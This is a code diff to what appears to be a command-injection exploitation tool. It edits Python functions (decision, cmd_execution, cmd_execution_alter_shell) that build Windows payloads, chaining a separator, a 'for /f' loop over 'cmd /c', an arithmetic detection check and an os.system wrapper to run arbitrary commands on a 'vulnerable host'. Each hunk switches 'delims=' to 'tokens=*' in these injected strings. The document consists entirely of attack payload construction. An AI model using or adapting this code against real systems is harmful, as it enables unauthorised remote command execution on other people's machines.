@@ -28,7 +28,7 @@ def decision(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
     if separator == "":
       payload = ("print(`echo " + TAG + "`." +
-                  "`for /f \"delims=\" %i in ('cmd /c \"" + 
+                  "`for /f \"tokens=*\" %i in ('cmd /c \"" + 
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
                   "\"') do @set /p =%i < nul`." +
                   "`echo " + TAG + "`." +
@@ -37,7 +37,7 @@ def decision(separator, TAG, randv1, randv2):
                 )
     else:
       payload = ("print(`echo " + TAG +
-                  separator + "for /f \"delims=\" %i in ('cmd /c \"" + 
+                  separator + "for /f \"tokens=*\" %i in ('cmd /c \"" + 
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
                   "\"') do @set /p =%i < nul" + 
                   separator + "echo " + TAG +
@@ -102,7 +102,7 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
-    cmd = ( "for /f \"delims=\" %i in ('cmd /c " + 
+    cmd = ( "for /f \"tokens=*\" %i in ('cmd /c " + 
             cmd +
             "') do @set /p =%i < nul"
           )
@@ -148,7 +148,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
       payload = (separator +cmd + " "
                 )
     else:
-      python_payload = ("for /f \"delims=\" %i in ('cmd /c " + 
+      python_payload = ("for /f \"tokens=*\" %i in ('cmd /c " + 
                         settings.WIN_PYTHON_DIR + " -c \"import os; os.system('" + cmd + "')\"" + 
                         "') do @set /p =%i < nul"
                        )
